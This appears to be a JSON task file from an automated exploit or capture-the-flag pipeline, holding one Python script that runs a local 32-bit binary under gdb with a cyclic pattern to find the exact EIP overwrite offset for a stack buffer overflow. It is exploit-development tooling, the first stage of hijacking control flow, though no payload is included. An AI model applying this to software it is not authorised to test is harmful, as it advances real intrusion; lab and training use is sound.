{
  "what_to_find": "Exact EIP overwrite offset (bytes) for the stack buffer overflow",
  "steps": [
    {
      "name": "find_eip_offset",
      "cmd": "python3 eip_offset.py",
      "success": "re:^offset=\\d+$",
      "artifact": "eip_offset.py",
      "code": "import os, struct, subprocess, sys, tempfile, re\n\ndef is_elf32_i386(path):\n    try:\n        with open(path, 'rb') as f:\n            data = f.read(0x40)\n        if len(data) < 0x20:\n            return False\n        if data[0:4] != b'\\x7fELF':\n            return False\n        ei_class = data[4]\n        ei_data = data[5]\n        if ei_class != 1:  # ELFCLASS32\n            return False\n        if ei_data == 1:\n            e_machine = struct.unpack('<H', data[18:20])[0]\n        elif ei_data == 2:\n            e_machine = struct.unpack('>H', data[18:20])[0]\n        else:\n            return False\n        return e_machine == 3  # EM_386\n    except Exception:\n        return False\n\ndef find_target():\n    cands = []\n    for name in sorted(os.listdir('.')):\n        if os.path.isfile(name) and os.access(name, os.X_OK) and is_elf32_i386(name):\n            cands.append(name)\n    return cands[0] if cands else None\n\ndef cyclic(length):\n    set1 = b\"abcdefghijklmnopqrstuvwxyz\"\n    set2 = b\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    set3 = b\"0123456789\"\n    out = bytearray()\n    for a in set1:\n        for b in set2:\n            for c in set3:\n                if len(out) >= length:\n                    return bytes(out[:length])\n                out.extend(bytes([a, b, c]))\n    return bytes(out[:length])\n\ndef main():\n    target = find_target()\n    if not target:\n        print(\"no_elf32_executable_found\")\n        return 1\n    pat = cyclic(1000)  # respects no brute-force > 1000\n    with tempfile.NamedTemporaryFile(delete=False) as tf:\n        tf.write(pat)\n        tf.flush()\n        pattern_path = tf.name\n    try:\n        cmd = ['gdb', '-q', '-nx', '-batch',\n               '-ex', 'set pagination off',\n               '-ex', f'run < {pattern_path}',\n               '-ex', 'info registers eip',\n               '--', f'./{target}']\n        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n        out = res.stdout.decode(errors='ignore')\n        m = re.search(r'\\beip\\s+0x([0-9a-fA-F]+)', out)\n        if not m:\n            print(\"no_eip_detected\")\n            return 2\n        eip = int(m.group(1), 16)\n        eip_bytes = struct.pack('<I', eip)\n        idx = pat.find(eip_bytes)\n        if idx >= 0:\n            print(f\"offset={idx}\")\n            return 0\n        else:\n            print(\"no_offset_match\")\n            return 3\n    finally:\n        try:\n            os.unlink(pattern_path)\n        except Exception:\n            pass\n\nif __name__ == '__main__':\n    sys.exit(main())"
    }
  ]
}